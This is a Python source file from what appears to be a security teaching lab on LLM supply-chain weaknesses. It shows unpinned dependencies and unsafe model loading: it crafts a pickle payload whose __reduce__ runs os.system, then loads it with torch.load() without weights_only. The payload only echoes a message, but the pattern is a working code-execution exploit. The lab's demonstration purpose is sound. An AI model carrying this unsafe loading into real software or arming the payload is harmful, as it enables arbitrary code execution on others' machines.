"""
LLM03 — Supply Chain Vulnerabilities
Vulnerable application.

Demonstrates three supply chain weaknesses:
  1. Unpinned dependencies — any version can be installed silently.
  2. Unsafe model loading — torch.load() without weights_only=True
     executes arbitrary code embedded in the .pt file via pickle.
  3. No integrity verification — model files are loaded without
     checking their SHA-256 hash against a known-good database.

This module does NOT require a real GPU or a real model file to
demonstrate the vulnerabilities — the pickle exploit is shown with
a lightweight synthetic .pt file created at runtime.

Run:
    python -m src.llm.llm03_supply_chain.vulnerable.app
"""

from __future__ import annotations

import io
import os
import pickle
import struct
import sys
import tempfile

# ---------------------------------------------------------------------------
# Vulnerability 1 — unpinned imports (no version check, no hash verification)
# ---------------------------------------------------------------------------


def show_installed_versions() -> None:
    """Print installed package versions — demonstrates unpinned / unaudited deps."""
    import importlib.metadata as meta

    packages = ["openai", "requests", "numpy"]
    print("\n[Installed package versions — no pins, no CVE check]")
    for pkg in packages:
        try:
            version = meta.version(pkg)
        except meta.PackageNotFoundError:
            version = "not installed"
        print(f"  {pkg:<15} {version}")
    print()


# ---------------------------------------------------------------------------
# Vulnerability 2 — unsafe model loading (pickle RCE)
# ---------------------------------------------------------------------------


class _MaliciousPicklePayload:
    """When deserialised this class executes an OS command.
    In a real attack this would be a reverse shell or credential exfiltration.
    """

    def __reduce__(self):
        return (
            os.system,
            ("echo '[PICKLE EXPLOIT] Arbitrary code executed during model load!'",),
        )


def create_malicious_model_file(path: str) -> None:
    """Write a fake .pt file that executes code when loaded via pickle."""
    with open(path, "wb") as fh:
        pickle.dump(_MaliciousPicklePayload(), fh)
    print(f"[+] Malicious model file created: {path}")


def load_model_vulnerable(path: str) -> None:
    """Load a model file WITHOUT weights_only=True — VULNERABLE to pickle RCE."""
    try:
        import torch

        print(f"[!] Loading model with torch.load() (no weights_only) — VULNERABLE")
        torch.load(path, map_location="cpu")  # executes __reduce__ payload
        print("[?] Load completed — pickle payload may have run silently.")
    except ImportError:
        # torch not installed — fall back to raw pickle to still show the issue
        print(
            f"[!] torch not available — demonstrating with raw pickle.load() — VULNERABLE"
        )
        with open(path, "rb") as fh:
            pickle.load(fh)  # executes __reduce__ payload


# ---------------------------------------------------------------------------
# Demo entry point
# ---------------------------------------------------------------------------


def main() -> None:
    print("=" * 60)
    print("LLM03 — Supply Chain  |  VULNERABLE application")
    print("=" * 60)

    show_installed_versions()

    # Create a temp malicious model file and load it unsafely
    with tempfile.NamedTemporaryFile(suffix=".pt", delete=False) as tmp:
        tmp_path = tmp.name

    try:
        create_malicious_model_file(tmp_path)
        print("\n[!] About to load the malicious model file unsafely…")
        load_model_vulnerable(tmp_path)
        print("\n[!] If you saw the EXPLOIT message above, the pickle attack worked.")
    finally:
        os.unlink(tmp_path)


if __name__ == "__main__":
    main()
